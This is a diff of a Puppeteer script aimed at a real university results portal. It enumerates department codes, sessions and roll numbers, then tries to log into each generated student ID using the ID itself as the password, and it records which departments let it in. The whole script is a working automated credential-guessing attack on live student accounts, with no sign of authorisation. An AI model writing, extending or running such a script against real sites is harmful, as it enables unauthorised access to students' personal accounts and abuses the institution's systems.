@@ -1,45 +1,48 @@
 const puppeteer = require("puppeteer");
 const fs = require("fs");
 
+// --- Configuration ---
 const baseUrl = "https://nubtkhulna.ac.bd/ter";
-const years = [16, 17, 18, 19, 20, 21, 22, 23, 24, 25]; // Years to check
-const terms = ["01", "03"]; // Semesters to check
-const rollEnd = 20; // Check only the first 20 students
+const years = [16,17,18,19,20];
+const terms = ["01", "03"];
+const rollEnd = 20;
 const resultsFilePath = "found_departments.json";
 
-// Helper function to retry failed operations
-const retry = async (fn, retries = 3, delay = 1500) => {
+// --- Helper function to retry failed operations ---
+const retry = async (fn, retries = 2, delay = 1500) => {
     for (let i = 0; i < retries; i++) {
         try {
             return await fn();
         } catch (err) {
             if (i === retries - 1) throw err;
-            // console.warn(`⚠️ Retry ${i + 1} due to: ${err.message}`);
             await new Promise(res => setTimeout(res, delay));
         }
     }
 };
 
-// Main function
+// --- Main function ---
 (async () => {
-    console.log("🚀 Launching browser...");
+    console.log("🚀 Script starting...");
     const browser = await puppeteer.launch({ headless: true });
+    console.log("✅ Browser launched.");
 
     let foundDepartments = [];
     // Load previous results if the file exists
     if (fs.existsSync(resultsFilePath)) {
         foundDepartments = JSON.parse(fs.readFileSync(resultsFilePath, "utf-8"));
-        console.log(`✅ Loaded ${foundDepartments.length} previously found departments.`);
+        console.log(`✅ Loaded ${foundDepartments.length} previously found departments from ${resultsFilePath}.`);
+    } else {
+        console.log("📄 No previous results file found. Starting fresh.");
     }
 
     // Labeled loop to allow breaking out and continuing to the next department
     departmentLoop:
-    for (let i = 97; i <= 122; i++) { // a-z
-        for (let j = 97; j <= 122; j++) { // a-z
-            for (let k = 97; k <= 122; k++) { // a-z
+    // Start with 'eee' (e=101)
+    for (let i = 101; i <= 122; i++) { // e-z
+        for (let j = (i === 101 ? 101 : 97); j <= 122; j++) { // e-z if i==e, else a-z
+            for (let k = (i === 101 && j === 101 ? 101 : 97); k <= 122; k++) { // e-z if i==e && j==e, else a-z
                 const department = (String.fromCharCode(i) + String.fromCharCode(j) + String.fromCharCode(k)).toUpperCase();
 
-                // Skip if this department has already been found in a previous run
                 if (foundDepartments.some(d => d.department === department)) {
                     console.log(`⏭️  Skipping already found department: ${department}`);
                     continue;
@@ -47,62 +50,72 @@ const retry = async (fn, retries = 3, delay = 1500) => {
 
                 console.log(`\n🔎 Searching department: ${department}`);
 
-                // Search through each session for this department
                 for (const year of years) {
                     for (const term of terms) {
                         const session = `${year}${term}`;
+                        console.log(`  -> Checking session: ${session}`);
 
-                        // Check the first 20 roll numbers
                         for (let roll = 1; roll <= rollEnd; roll++) {
                             const rollCode = `20${String(roll).padStart(3, "0")}`;
                             const userId = `${department}${session}${rollCode}`;
+                            
+                            // This log will be very frequent
+                            console.log(`    - Attempting ID: ${userId}`);
+                            
                             const page = await browser.newPage();
-                            await page.setDefaultNavigationTimeout(20000);
+                            await page.setDefaultNavigationTimeout(15000); // 15-second timeout
 
                             try {
+                                console.log(`      ➡️  Navigating to login page...`);
                                 await retry(() => page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" }));
+
+                                console.log(`      ⌨️  Typing credentials...`);
                                 await page.type("#username", userId);
                                 await page.type("#password", userId);
 
+                                console.log(`      🖱️  Clicking submit...`);
                                 await Promise.all([
                                     page.click("button[type=submit]"),
                                     page.waitForNavigation({ waitUntil: "domcontentloaded" })
                                 ]);
 
-                                // If login is successful, the URL will change to the student panel
                                 if (page.url().includes("panel")) {
-                                    console.log(`✅ FOUND: Department '${department}' is valid (discovered with ID: ${userId})`);
+                                    console.log(`      🎉 SUCCESS! Department '${department}' is valid (ID: ${userId})`);
                                     
-                                    // Add to our list and save progress immediately
                                     foundDepartments.push({ department });
                                     fs.writeFileSync(resultsFilePath, JSON.stringify(foundDepartments, null, 2));
+                                    console.log(`      💾 Saved to ${resultsFilePath}.`);
                                     
-                                    // Logout to be safe
                                     await page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" });
                                     await page.close();
 
-                                    // Move to the next department code
                                     continue departmentLoop;
+                                } else {
+                                     // This case is unlikely to be hit if the promise resolves without error,
+                                     // but we log it just in case.
+                                     console.log(`      ❌ Failed (Incorrect credentials).`);
                                 }
                             } catch (error) {
-                                // Ignore login/timeout errors as they mean the ID is invalid
+                                console.log(`      ❌ Failed (Timeout or navigation error).`);
                             } finally {
                                 if (!page.isClosed()) {
+                                    console.log(`      📄 Closing page.`);
                                     await page.close();
                                 }
                             }
-                        } // End roll loop
-                    } // End term loop
-                } // End year loop
-                 console.log(`❌ No students found for ${department}. Moving on.`);
+                        } 
+                    } 
+                } 
+                 console.log(`🤷 No students found for ${department} in any session. Moving on.`);
             }
         }
     }
 
+    console.log("✅ Closing browser...");
     await browser.close();
 
-    console.log("\n\n--- DISCOVERY COMPLETE ---");
+    console.log("\n\n--- ✨ DISCOVERY COMPLETE ✨ ---");
     console.log("Found the following valid departments:");
     console.table(foundDepartments);
-    console.log(`Results have been saved to ${resultsFilePath}`);
+    console.log(`Final results are saved in ${resultsFilePath}`);
 })();
